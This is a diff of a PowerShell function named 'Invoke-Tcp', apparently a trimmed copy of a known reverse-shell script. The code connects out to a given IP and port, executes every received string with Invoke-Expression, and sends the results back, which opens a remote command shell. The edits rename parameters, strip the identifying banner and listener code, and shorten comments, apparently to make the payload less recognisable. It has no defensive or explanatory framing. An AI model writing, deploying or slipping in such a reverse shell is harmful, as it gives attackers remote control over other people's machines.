@@ -1,34 +1,25 @@
 function Invoke-Tcp 
 { 
    
-    [CmdletBinding(DefaultParameterSetName="r")] Param(
-
-        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="r")]
+    [CmdletBinding()]
+    Param(
+        [Parameter(Position = 0, Mandatory = $true)]
         [String]
-        $IPAddress,
+        $IP,
 
-        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="r")]
+        [Parameter(Position = 1, Mandatory = $true)]
         [Int]
-        $Port,
-
-        [Parameter(ParameterSetName="r")]
-        [Switch]
-        $Reverse
+        $P
     )
-
     
     try 
     {
-        $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
+        $client = New-Object System.Net.Sockets.TCPClient($IP,$P)
         
         $stream = $client.GetStream()
         [byte[]]$bytes = 0..65535|%{0}
 
-        #Send back current username and computername
-        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
-        $stream.Write($sendbytes,0,$sendbytes.Length)
-
-        #Show an interactive PowerShell prompt
+        # show path
         $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
         $stream.Write($sendbytes,0,$sendbytes.Length)
 
@@ -38,7 +29,7 @@ function Invoke-Tcp
             $data = $EncodedText.GetString($bytes,0, $i)
             try
             {
-                #Execute the command on the target.
+                # run command
                 $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
             }
             catch
@@ -51,16 +42,12 @@ function Invoke-Tcp
             $error.clear()
             $sendback2 = $sendback2 + $x
 
-            #Return the results
+            # send results
             $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
             $stream.Write($sendbyte,0,$sendbyte.Length)
             $stream.Flush()  
         }
         $client.Close()
-        if ($listener)
-        {
-            $listener.Stop()
-        }
     }
     catch
     {
